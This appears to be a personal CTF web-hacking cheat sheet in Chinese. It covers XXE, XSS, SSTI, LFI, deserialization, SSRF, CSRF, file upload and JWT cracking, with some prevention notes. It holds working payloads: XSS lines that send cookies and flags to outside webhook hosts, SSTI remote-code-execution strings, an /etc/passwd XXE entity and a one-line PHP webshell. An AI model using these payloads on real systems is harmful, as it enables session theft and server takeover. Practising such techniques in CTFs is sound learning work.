---
title: Web Cheat Sheet
tags: [Tools, CTF, Web]

category: "Tools｜CTF"
date: 2024-02-07
---

# Web Cheat Sheet
<!-- more -->
## 解題重點
* `robots.txt`
* 掃port: nmap: `$ sudo apt install net-tools`[NMAP教學](https://blog.gtwang.org/linux/nmap-command-examples-tutorials/)
    * nmap: `$ nmap <url>`
* 封包headers和contents: Wireshark、Browser、BurpSuite
* cookies
* Enum directory/dns

### Information Leak
* [`.DS_Store` - lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp)
* [`gitleak` - denny0223/scrabble](https://github.com/denny0223/scrabble): 確認有無`https://<victim url>/.git/config`
    ```bash
    $ chmod +x scrabble
    $ ./scrabble <url> [directory]
    $ ./scrabble http://example.com/my-project.git/
    ```

### Injection
#### SQLi
* [SQLMAP1](https://ithelp.ithome.com.tw/articles/10249487)
* [SQLMAP2](https://ithelp.ithome.com.tw/articles/10202811)
    ```bash
    $ sudo apt install sqlmap
    ```

#### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <data><ID>&xxe;</ID></data>
```

* 如何預防: 
    * 使用安全配置的 XML parser（如 Java 的 XMLInputFactory 關閉 DTD 與 external entities），因為xxe的攻擊前提在於開啟了不必要的兩個feature，讓attacker可以構造出一組讀取自創的DTD或是外部entity，達成LFI(算是?)
    * 避免不必要的功能開啟
    * 做好輸入驗證和最小權限策略

#### XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
```javascript
</script><script>
fetch(`/getflag\)
    .then(r=>r.text())
    .then(flag=>location.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`
    )
</script>
```

* 利用XSS把session打到webhook上
    {% raw %}    
    ```javascript?
    window.location=<requestbin.com>/?a+document.cookie
    // or
    fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
    ```
    {% endraw %}

#### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)

#### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
* 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
* 用[tplmap](https://github.com/epinna/tplmap)直接打
    ```bash
    $ ./tplmap.py --engine Jinja2 --os-shell -u "http://rescued-float.picoctf.net:56957/announce" -X POST -d "content=bob"
    $ ./tplmap.py --engine pug --os-shell -u "http://h4ck3r.quest:8008/?name=bob"
    ```
* Python(Flask): Jinja2
* Node.js(Express): PUG / EJS
* SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
    {% raw %}
    ```
    {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}}
    {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
    ```

    [](https://onsecurity.io/article/server-side-template-injection-with-jinja2/): 如果`.`, `|`, `_`, `[]`, `|join`這幾個字元是黑名單，可以嘗試用hex
    ```
    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
    ```
    {% endraw %}

    

### LFI
只是能讀取到victim server上的file content，不見得會有價值，需要搭配其他手法，例如
1. 寫入webshell之類的達到RCE
2. 利用PHP的偽協議達到讀特殊檔案的需求
   * `http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>`

### Deserialization
要能夠達成insecure的反序列化，最重要的兩個前提是1) 反序列化的資料可控 2) 針對各個語言反序列化時或之後會觸發哪些magic method
* 可以搭配command injection
* php可以搭配`phar`
* POP Chain: 幾乎每個語言都會有類似的問題存在，最常出現在 PHP 反序列化漏洞（PHP Object Injection） 裡。把一堆「本來正常的 class 功能」串起來，變成可以執行惡意行為的一條攻擊鏈。
    * [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc): 可以直接看對應的PHP框架有沒有對應的payload達到RCE
    * [ysoserial](https://github.com/frohoff/ysoserial): 紀錄JAVA版本的POP chain gadgets
    * [ysoserial.net](https://github.com/pwntester/ysoserial.net)

|語言|序列化|反序列化|Magic Method|
|---|---|---|---|
|Python|pickle.dumps()|pickle.loads()|`__reduce`|
|PHP|serialize||unserialize|`__destruct()`: Object被銷毀或garbage collection會觸發<br>`__wakeup()`: unserialize時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成String處理時呼叫，`echo $obj;`<br>|
|Java|||`toString`<br>`readObject`<br>`finalize`|
|.NET|||ViewState & Session會存放序列化資料|

### Frontend
攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)

### SSRF
create一個偽造的payload和一個對外的中間server溝通，並讓這個中間server因為我的偽造payload而同意讓我和更裡面的內網server溝通，這樣我就打到inner server，如果有preview card這樣的網站要特別注意有沒有SSRF的問題
* 利用gopher協議建一個偽造payload

* 如何預防:
    * 限制可訪問的 URL / IP 範圍(使用whitelist)
    * 避免解析內部 IP → 防止攻擊者透過 URL 指向內網或 localhost (127.0.0.1) 服務。
    * 使用安全的 HTTP client → 設定 timeout、最大連線數、禁用不必要的協議（FTP、file://、gopher:// 等）。
    * 對特殊情境使用代理 / sandbox

### CSRF(Cross-Site Request Frogery)
* [[Day25]- 新手的Web系列CSRF](https://ithelp.ithome.com.tw/articles/10251769)
> 1. 使用者登入網站
> 2. 使用者透過身份驗證在本機形成cookie
> 3. 使用者點擊含有惡意程式的連結，或是直接連結了第三方網站，並瀏覽了帶有以下html程式碼的網頁：`<img src=http://www.***.com/transfer.php?id=5&money=22>`
> 4. 惡意程式碼利用使用者的身份發請求，即執行CSRF
> 5. 使用者的帳號少錢錢勒QQ
>
> ![](https://i.imgur.com/gwCvSqZ.png)
> 
> 常見的CSRF方法
> * HTML標籤
>    * `<img>`標籤屬性
>        ```html
>        <img src="惡意連結">
>        ```
>        以GET方式請求第三方網站，瀏覽器會帶上使用者的cookie發出GET請求
>    
>    * `<script>`標籤屬性
>        ```javascript
>        `<script src="惡意連結">`
>        ```
>    * `<iframe>`標籤屬性
>        ```html
>        `<iframe src="惡意連結">`
>        ```

也就是他和XSS的其中一個目的有點像，那就是偷到使用者的cookie/session，只是方式不同，一個是利用javascript的injection，一個則是利用釣魚或其他的方式迫使使用者**點開**惡意網站，並且冒用使用者的身份對原本使用者正在使用的網站進行各種request，如果該網站沒有對user進行額外的身份驗證，那們光靠user cookie/session就有機會達成轉帳、發文之類的操作

#### 如何預防CSRF
* CSRF Token: 這是最簡單的方式，既然attacker可以透過惡意網站得到victim的cookie，那我就額外在server side多一個驗證token的步驟，而該token無論如何都不會被attacker利用惡意網站得知，就可以確保目前的request是不是本人，而為什麼CSRF token無法被attacker得知呢?核心原因在於 Same-Origin Policy (SOP)。這是瀏覽器的安全機制，規定：
    > JavaScript 或網頁只能讀取**同一來源（protocol + domain + port）**的資源，不能跨域讀取其他網站的內容。

    所以，attacker的惡意網站並不會得知user在a.com這個網域的token，應該說原本就是這樣設計的，所以除非attacker**現場**看到受害者的browser content，才能得知CSRF Token
* SameSite Cookie
    
    就是設定cookie
    > Set-Cookie: sessionid=abc123; SameSite=Strict

    SameSite的效果是跨網站 request 不會帶 cookie，那麼同樣的就算victim點開malicious website，也一樣不會被對方讀取到cookie
* 敏感操作使用 POST

    前面的payload範例有提到很多都是透過GET qeury進行惡意操作，那麼我們只要把敏感操作都利用POST的方式處理，就可以大大降低CSRF發生的情況

### Upload
* 如果沒有任何保護: 直接upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到RCE
* 如果有保護但只看extension: 那就偽造extension後夾帶webshell達到RCE(`webshell.png.php`)
* bypass `IMAGETYPE`(加入合法的File Signature) + bypass file type(修改封包header)

### 如果是WordPress網頁
* [WpScan](https://wpscan.com/)專門檢測WordPress類型的網頁，有哪些漏洞，前期可以掃描出WP版本、安裝的theme或是插件有哪些、安全漏洞等等

## Tools

| Fuck| Beautifier|
| --- | --- |
| [jsfuck](http://www.jsfuck.com/)<br>[JS 混淆器](https://obfuscator.io/)| 把JS的程式變成可讀性很差的東西 | [JSNice](http://www.jsnice.org/) |
|[jjencode](https://utf-8.jp/public/jjencode.html)|[JS 反混淆器](https://beautifier.io/): 可以反混淆或解密JS的檔案|
|[aaencode](https://utf-8.jp/public/aaencode.html)|[JS 壓縮+加密+混淆+美化](https://js.wfuapp.com/)|
|[Esolang List](https://esolangs.org/wiki/Language_list)|[JS Fuck Decode](https://www.53lu.com/tool/jsfuckdecode/)|
||[aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)|

* psysh: PHP的互動式shell

* wasm → c: [wabt](https://github.com/WebAssembly/wabt)
    ```bash
    # 安裝Cmake，所有過程一定要用WSL
    $ mkdir build && cd build
    $ cmake ..
    $ cmake --build .
    # 按照說明build完後進到./build
    $ ./wasm2c {wasm file path} -o {output c file path}
    ```

* Webhook
    * [Webhook.site](https://webhook.site/)
    * [Beeceptor](https://beeceptor.com/)
    * [Ngrok](https://ngrok.com/)

* [JWT Decoder/Encoder](https://www.jwt.io/)

* 爆破JWT
    * 利用Hashcat
        ```bash
        $ hashcat -a 3 -m 16500 jwt.txt ?a?a?a?a
        ```
    * 利用John
    ```bash
    $ john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256  
    ```